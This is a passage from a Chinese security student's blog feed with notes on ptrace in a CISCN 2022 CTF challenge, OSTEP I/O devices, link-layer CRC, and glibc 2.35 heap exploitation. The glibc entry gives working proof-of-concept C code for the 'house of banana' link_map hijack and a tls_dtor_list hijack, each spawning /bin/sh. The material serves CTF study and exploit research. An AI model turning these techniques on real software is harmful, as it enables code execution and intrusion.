class="line">      ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      wait(&amp;status); <span class="comment">// 接收被子进程发送过来的 SIGTRAP 信号(系统调用返回触发)</span></span><br><span class="line">      <span class="comment">//系统调用返回值</span></span><br><span class="line">      ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); <span class="comment">// 获取被跟踪进程寄存器的值</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;orig_rax: %llx\t&quot;</span>, regs.orig_rax); <span class="comment">// 打印rax寄存器的值</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;rax: %llx\n&quot;</span>, regs.rax);           <span class="comment">// 打印rax寄存器的值</span></span><br><span class="line">      <span class="keyword">if</span> (WIFEXITED(status)) &#123; <span class="comment">// 如果子进程退出了, 那么终止跟踪</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;++++++++++++++++++++++&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, status);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231014223223759.png" alt="image-20231014223223759"></p><p>基本上可以和strace输出结果对上</p><ul><li><a href="https://zhuanlan.zhihu.com/p/641501227">https://zhuanlan.zhihu.com/p/641501227</a></li><li><a href="https://www.cnblogs.com/heixiang/p/10988992.html">https://www.cnblogs.com/heixiang/p/10988992.html</a></li></ul><h2 id="ciscn2022-syscall"><a href="#ciscn2022-syscall" class="headerlink" title="ciscn2022 syscall"></a>ciscn2022 syscall</h2><p>首先是父线程分支</p><p>通过<code>ptrace(PTRACE_GETREGS, (unsigned int)a1, 0LL, &amp;s);</code>可以判断处s是一个user_regs_struct的结构体定义在<code>#include &lt;sys/user.h&gt;</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r15;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r14;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r13;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r12;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r11;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r10;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r9;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r8;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rcx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> orig_rax;<span class="comment">//系统调用号号</span></span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rip;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> cs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> eflags;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ss;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ds;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> es;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>定义结构体后代码就清晰明了多了</p><p>首先第一个waitpid被子线程里的<code>raise(18)</code>唤醒</p><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231015011436298.png" alt="image-20231015011436298"></p><p>这里判断低字节为0x7f是为了判断子线程是否收因信号传递而停止</p><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231015012226004.png" alt="image-20231015012226004"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> WIFSTOPPED(status)    __WIFSTOPPED (status)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    __WIFSTOPPED(status)(((status) &amp; 0xff) == 0x7f)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:35&amp;&amp;36&amp;&amp;37&amp;&amp;44 IO设备</title>
      <link href="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/"/>
      <url>/2023/10/09/OSTEP-35-36-37-44-IO-Devices/</url>
      
        <content type="html"><![CDATA[<h2 id="存储设备"><a href="#存储设备" class="headerlink" title="存储设备"></a>存储设备</h2><p>评价方法：价格、容量、速度、可靠性</p><h3 id="存储介质：磁"><a href="#存储介质：磁" class="headerlink" title="存储介质：磁"></a>存储介质：磁</h3><p>磁带–&gt;磁盘</p><h3 id="存储介质：坑"><a href="#存储介质：坑" class="headerlink" title="存储介质：坑"></a>存储介质：坑</h3><p>光盘Compact Disk</p><p>利用坑来阻碍光的反射，有了母片很容易通过 “压盘” 复制产品，但是只读(挖坑容易填坑难，暗示我经常挖坑不填?😢)</p><h3 id="存储介质：电"><a href="#存储介质：电" class="headerlink" title="存储介质：电"></a>存储介质：电</h3><p>之前的持久存储介质有致命的缺陷</p><ul><li>磁：机械部件导致 ms 级延迟</li><li>坑 (光): 一旦挖坑，填坑很困难 (CD是只读的)</li></ul><p>Flash Memory “闪存”</p><ul><li>Floating gate 的充电&#x2F;放电实现 1-bit 信息的存储</li></ul><p><img src="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/image-20231009114124863.png" alt="image-20231009114124863"></p><p>速度快，容量越大，速度越快 (电路级并行)</p><p>衍生出一系列产品:Compact Flash(CF卡，对就是mp3上的那种)–&gt;USB Flash Disk(U盘)–&gt;Flash-based SSDs(solid-state storage device,固态存储设备)</p><ul><li>听说固态最近好像价格回升，我大概五月份买的时候三星，西部数据这样的大厂都便宜的离谱，多是归功于国产ssd技术突破，长江NB</li></ul><h4 id="固态硬盘需要克服的问题"><a href="#固态硬盘需要克服的问题" class="headerlink" title="固态硬盘需要克服的问题"></a>固态硬盘需要克服的问题</h4><p>一个闪存面被分为闪存块，一个闪存块被分为闪存页，对于读来说正常读一个页，写来说需要将页所在的整个块擦除，这也是我们固态读比写慢的原因</p><p><strong>最大问题还是放电 (erase) 做不到 100% 放干净</strong></p><ul><li>放电数千&#x2F;数万次以后，就好像是 “充电” 状态了</li></ul><p>解决方案:每一个 SSD 里都藏了一个完整的计算机系统</p><p><img src="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/image-20231009121357473.png" alt="image-20231009121357473"></p><p>FTL: Flash Translation Layer</p><p>维护这逻辑块到物理块的一张映射表: 对于逻辑块的读写转化为物理块的写，当发现这个物理块被读写的次数对于大多数物理块时，将逻辑块重新映射到一个读写次数相对少的物理块，从而维持一种平衡叫做Wear Leveling</p><p><strong>安全问题</strong></p><p>FTL也就可以提供一种逻辑上的快速清除，实际上物理块没有被清除(冠希哥被动躺枪)，清除后用垃圾数据覆盖或许可以避免悲剧😂</p><h2 id="I-x2F-O设备"><a href="#I-x2F-O设备" class="headerlink" title="I&#x2F;O设备"></a>I&#x2F;O设备</h2><p>I&#x2F;O 设备 (CPU 视角)：“一个能与 CPU 交换数据的接口&#x2F;控制器”</p><p><img src="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/image-20231009132407402.png" alt="image-20231009132407402"></p><p>通过接口来为上层提供服务，操作系统不需要关心设备internals以及内部怎么实现，只要按照设备手册通过接口来交流即可(给寄存器一个值，设备做出相应反应)</p><ul><li>CPU 可以直接使用指令 (in&#x2F;out&#x2F;MMIO) 和设备交换数据(MMIO(memory-mapped I&#x2F;O)用内存映射的方式通过内存地址和设备交互)</li></ul><h3 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h3><p>为了支持越来越多的io设备(可拓展性)CPU上出现了总线：一个特殊的 I&#x2F;O 设备</p><ul><li>把收到的地址 (总线地址) 和数据转发到相应的设备上</li><li>总线上可以接dram，甚至可以给总线上接的设备进行内存编制，统一按照内存地址来操作设备，其他设备pci也可以连接到总线，如usb总线</li></ul><p>为了提高cpu效率，当设备完成了自身操作，会主动抛出一个硬件中断，在此期间cpu可以执行其他进程（如果设备非常快，中断可能不如轮询）</p><h3 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h3><p>向磁盘写一些数据，cpu需要将数据从内存拷贝到磁盘，磁盘 I&#x2F;O执行完，cpu才能切走到其他工作，为了提高效率把简单的拷贝工作交给DMA</p><p>操作系统会通过编程告诉 DMA 引擎数据在内存的位置，要拷贝的大小以及要拷贝到哪个设备。</p><p>Direct Memory Access (DMA)：一个专门执行 “<code>memcpy</code>” 程序的 CPU(用于I&#x2F;O设备和系统内存直接的批量数据传送)</p><p>很容易可以联系到GPU，nvidia yes！</p><h3 id="设备驱动程序"><a href="#设备驱动程序" class="headerlink" title="设备驱动程序"></a>设备驱动程序</h3><p>操作系统不应该把io设备的寄存器接口暴露给用户取操作，这是不合理且危险的，比如大多数普通用户操作不好打印机寄存器接口造成经济损失</p><p>linux把设备抽象成文件，linux驱动程序会把重新定义一些文件操作相关函数，驱动程序把系统调用 (read&#x2F;write&#x2F;ioctl&#x2F;…) “翻译” 成与设备寄存器的交互，完成复杂的功能</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc2.35利用</title>
      <link href="/2023/09/30/glibc235-attack/"/>
      <url>/2023/09/30/glibc235-attack/</url>
      
        <content type="html"><![CDATA[<p><strong>基于2.35-0ubuntu3_amd64</strong></p><p>失去了free malloc realloc exit hook</p><p>试了一下exit去改_rtld_global._dl_ns[0]._ns_loaded.l_addr控制析构还是有用的</p><p>house of banana依旧可行</p><p>poc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span> - <span class="number">0x80ed0</span>;</span><br><span class="line">      <span class="type">size_t</span> _rtld_global_ptr_next_next_next = libc_base + <span class="number">0x3fd040</span><span class="number">-0x41d88</span>;<span class="comment">//distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) rtld_global_ptr与libc_base的偏移不固定，可能会在地址的第2字节处发生变化</span></span><br><span class="line">  <span class="comment">//large bin attach</span></span><br><span class="line">  <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr0);</span><br><span class="line">  <span class="comment">// put ptr0 into large bin</span></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr1); <span class="comment">// free ptr1 into unsorted bin</span></span><br><span class="line">  <span class="comment">// bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">  *(<span class="type">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_next_next_next - <span class="number">0x20</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//修改最后一个link_map DT_FINI_ARRAY</span></span><br><span class="line">  <span class="type">size_t</span> *fakelinkmap = (<span class="type">size_t</span> *)(ptr1<span class="number">-0x10</span>);<span class="comment">//subtract chunk head</span></span><br><span class="line">  fakelinkmap[<span class="number">3</span>]=<span class="number">0</span>;<span class="comment">//绕过 assert (ns != LM_ID_BASE || i == nloaded);</span></span><br><span class="line">  fakelinkmap[<span class="number">5</span>] = (<span class="type">size_t</span>)fakelinkmap;     <span class="comment">// l_real</span></span><br><span class="line">  fakelinkmap[<span class="number">34</span>] = (<span class="type">size_t</span>)&amp;fakelinkmap[<span class="number">34</span>];                      <span class="comment">// l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line">  fakelinkmap[<span class="number">35</span>]=(<span class="type">size_t</span>)&amp;fakelinkmap[<span class="number">38</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr    </span></span><br><span class="line">  fakelinkmap[<span class="number">36</span>]=(<span class="type">size_t</span>)&amp;fakelinkmap[<span class="number">36</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">  fakelinkmap[<span class="number">37</span>]=<span class="number">0x8</span>;<span class="comment">//i=l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">  fakelinkmap[<span class="number">38</span>]=(<span class="type">size_t</span>)backdoor;<span class="comment">//call array[i]</span></span><br><span class="line">  fakelinkmap[<span class="number">0x63</span>]=<span class="number">0x800000000</span>;<span class="comment">//使l-&gt;l_init_called 为1</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//或者修改最后一个link_map的DT_FINI</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  size_t *fakelinkmap = (size_t *)(ptr1-0x10);//subtract chunk head</span></span><br><span class="line"><span class="comment">  fakelinkmap[3]=0;</span></span><br><span class="line"><span class="comment">  fakelinkmap[5] = (size_t)fakelinkmap;     // l_real</span></span><br><span class="line"><span class="comment">  fakelinkmap[8+13] =  (size_t)&amp;fakelinkmap[34];                      // l-&gt;l_info[13] DT_FINI</span></span><br><span class="line"><span class="comment">  fakelinkmap[8+26] = 0;                      // l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line"><span class="comment">  fakelinkmap[35]=(size_t)backdoor;//l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr    </span></span><br><span class="line"><span class="comment">  fakelinkmap[0x63]=0x800000000;//使l-&gt;l_init_called 为1</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面poc主要是改了最后一个link_map，也可以改第一个link_map,把第一个link_map的next改为原本的第二个link_map满足4个链表，绕过 assert (ns !&#x3D; LM_ID_BASE || i &#x3D;&#x3D; nloaded);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">原本的第二个link_map</span><br><span class="line">pwndbg&gt; p (_rtld_global._dl_ns._ns_loaded[<span class="number">0</span>].l_next) </span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">struct</span> link_map *) <span class="number">0x7ffff7ffe890</span></span><br></pre></td></tr></table></figure><h2 id="tls-dtor-list攻击劫持exit执行流"><a href="#tls-dtor-list攻击劫持exit执行流" class="headerlink" title="tls_dtor_list攻击劫持exit执行流"></a><a href="https://m4tsuri.io/2020/10/18/glibc-tls/">tls_dtor_list攻击劫持exit执行流</a></h2><p>exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);</span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tls_dtor_list是下面的结构体，一般都是空的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble __call_tls_dtors                                                                                                                                                                     </span><br><span class="line">Dump of assembler code for function __GI___call_tls_dtors:                                                                                                                                                    </span><br><span class="line">   0x00007ffff7c45d60 &lt;+0&gt;:     endbr64                                                                                                                                                                       </span><br><span class="line">   0x00007ffff7c45d64 &lt;+4&gt;:     push   rbp                                                                                                                                                                    </span><br><span class="line">   0x00007ffff7c45d65 &lt;+5&gt;:     push   rbx</span><br><span class="line">   0x00007ffff7c45d66 &lt;+6&gt;:     sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c45d6a &lt;+10&gt;:    mov    rbx,QWORD PTR [rip+0x1d301f]        # 0x7ffff7e18d90</span><br><span class="line">   0x00007ffff7c45d71 &lt;+17&gt;:    mov    rbp,QWORD PTR fs:[rbx];fs:[rbx]处为tls_dtor_list</span><br><span class="line">   0x00007ffff7c45d75 &lt;+21&gt;:    test   rbp,rbp;判断tls_dtor_list是否为空</span><br><span class="line">   0x00007ffff7c45d78 &lt;+24&gt;:    je     0x7ffff7c45dbd &lt;__GI___call_tls_dtors+93&gt;;为空结束</span><br><span class="line">   0x00007ffff7c45d7a &lt;+26&gt;:    nop    WORD PTR [rax+rax*1+0x0];无影响</span><br><span class="line">   0x00007ffff7c45d80 &lt;+32&gt;:    mov    rdx,QWORD PTR [rbp+0x18];next指针给rdx</span><br><span class="line">   0x00007ffff7c45d84 &lt;+36&gt;:    mov    rax,QWORD PTR [rbp+0x0];func给rax</span><br><span class="line">   0x00007ffff7c45d88 &lt;+40&gt;:    ror    rax,0x11</span><br><span class="line">   0x00007ffff7c45d8c &lt;+44&gt;:    xor    rax,QWORD PTR fs:0x30;func循环右移11位，再和fs:0x30处异或,</span><br><span class="line">   0x00007ffff7c45d95 &lt;+53&gt;:    mov    QWORD PTR fs:[rbx],rdx;将next存回tls_dtor_list，tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">   0x00007ffff7c45d99 &lt;+57&gt;:    mov    rdi,QWORD PTR [rbp+0x8];obj当作参数</span><br><span class="line">   0x00007ffff7c45d9d &lt;+61&gt;:    call   rax;调用func</span><br><span class="line">   0x00007ffff7c45d9f &lt;+63&gt;:    mov    rax,QWORD PTR [rbp+0x10]</span><br><span class="line">   0x00007ffff7c45da3 &lt;+67&gt;:    lock sub QWORD PTR [rax+0x468],0x1</span><br><span class="line">   0x00007ffff7c45dac &lt;+76&gt;:    mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c45daf &lt;+79&gt;:    call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c45db4 &lt;+84&gt;:    mov    rbp,QWORD PTR fs:[rbx]</span><br><span class="line">   0x00007ffff7c45db8 &lt;+88&gt;:    test   rbp,rbp</span><br><span class="line">   0x00007ffff7c45dbb &lt;+91&gt;:    jne    0x7ffff7c45d80 &lt;__GI___call_tls_dtors+32&gt;</span><br><span class="line">   0x00007ffff7c45dbd &lt;+93&gt;:    add    rsp,0x8</span><br><span class="line">   0x00007ffff7c45dc1 &lt;+97&gt;:    pop    rbx</span><br><span class="line">   0x00007ffff7c45dc2 &lt;+98&gt;:    pop    rbp</span><br><span class="line">   0x00007ffff7c45dc3 &lt;+99&gt;:    ret  </span><br></pre></td></tr></table></figure><p>可以控制tls_dtor_list里的dtor_list–&gt;func为system dtor_list–&gt;obj为指向binsh字符串地址</p><p>或者因为他是利用rbp来存放dtor_list，可以在dtor_list–&gt;func存放leave ret地址，dtor_list–&gt;obj及下面存放rop链，就可以实现rop</p><p>需要满足</p><ul><li><p>泄露libc，获取tls_dtor_list等地址</p><ul><li>可以配合largebin attach把堆地址写入tls_dtor_list(largebin中有一个free_chunk,修改 free_chunk 的 bk_nextsize 为tls_dtor_list-0x20,就可以把free_chunk写入tls_dtor_list）</li></ul></li><li><p>能够篡改或泄露<code>fs_base + 0x30</code>的值</p></li><li><p>通过exit退出程序</p></li></ul><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">size_t</span> value,<span class="type">size_t</span> key)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> newval=(value^key);</span><br><span class="line">  <span class="keyword">return</span> (newval&lt;&lt;<span class="number">0x11</span>)|(newval&gt;&gt;(<span class="number">64</span><span class="number">-0x11</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> fsbase;</span><br><span class="line">  <span class="type">size_t</span> tls_dtor_list_addr,key;</span><br><span class="line">  __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(fsbase))</span>;</span><br><span class="line">  tls_dtor_list_addr = fsbase - <span class="number">88</span>;<span class="comment">//获取到tls_dtor_list位置</span></span><br><span class="line">  key=*(<span class="type">size_t</span>*)(fsbase+<span class="number">0x30</span>);</span><br><span class="line">  <span class="type">char</span> *binsh = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(binsh,<span class="string">&quot;/bin/sh\x00&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *fake_tls_dtor = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  fake_tls_dtor[<span class="number">0</span>] = encrypt((<span class="type">size_t</span>)&amp;system, key);</span><br><span class="line">  fake_tls_dtor[<span class="number">1</span>] = (<span class="type">size_t</span>)binsh;</span><br><span class="line">  *(<span class="type">size_t</span> *)tls_dtor_list_addr=(<span class="type">size_t</span>)fake_tls_dtor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络:链路层</title>
      <link href="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p> 链路层主体部分是在网络适配器(网卡)用硬件实现的，少部分靠软件实现</p><h2 id="检错纠错技术"><a href="#检错纠错技术" class="headerlink" title="检错纠错技术"></a>检错纠错技术</h2><h3 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h3><p>奇校验：原始码流+校验位 总共有奇数个1</p><p>偶校验：原始码流+校验位 总共有偶数个1</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926152653775.png" alt="image-20230926152653775"></p><p>只能检错出奇数个bit错误</p><p><strong>二维奇偶检验</strong></p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926152501504.png" alt="image-20230926152501504"></p><p>可以检测数据出错位置并纠正，只能检测校验比特错误但不能纠正</p><h3 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h3><h3 id="循环冗余检测"><a href="#循环冗余检测" class="headerlink" title="循环冗余检测"></a><a href="https://www.bilibili.com/video/BV1V4411Z7VA/">循环冗余检测</a></h3><p>Cyclic Redundancy Check，CRC</p><p>crc里采用了模二运算:加法无进位，减法无借位，也就等价于异或</p><p>双方协商一个r+1比特模式，叫做生成多项式G，G的最高有效比特位应为1</p><p>CRC标准能检测小于 r + 1 比特的突发差错</p><p>发送方对于数据D要加r个附加比特R作为发送数据X，这个R要使发送数据X可以被生成多项式G做模二算数整除</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926152617713.png" alt="image-20230926152617713"></p><p>对于接收方</p><ul><li>如果用生成多项式G除得尽，表明数据正确；</li><li>如果除不尽，<code>余数将指明出错位所在位置</code>。</li></ul><p><strong>发送方这么求这个R?</strong></p><p>根据上述需要满足$D\times2^r\ xor\ R &#x3D;nG$</p><p>两边同时再异或个R可得$D\times2^r&#x3D;nG\ xor\ R$</p><p>右边就可以被G除就可以获得于余数R $R&#x3D;remainder\frac {D\times2^r}G$这一步就说明了R怎么求: D左移r位，模二除G得到余数 </p><p>检验过程硬件电路实现实现比较简单快速</p><p><a href="https://www.bilibili.com/video/BV1V4411Z7VA/">https://www.bilibili.com/video/BV1V4411Z7VA/</a></p><p>视频里串行crc硬件实现部分: </p><p>多项式G为$x^4+x+1$ 即除数G&#x3D;10011</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230926184135975.png" alt="image-20230926184135975"></p><p>类别小学列竖式时的除法，探测仪处为0时证明不够除，被除数左移一位，为1时，做模二减法即做异或操作，即把为除数为1的位置反转，为0的位置不变，对于位于除数探测位的1来说此时这里数值为1，1 xor 1 &#x3D; 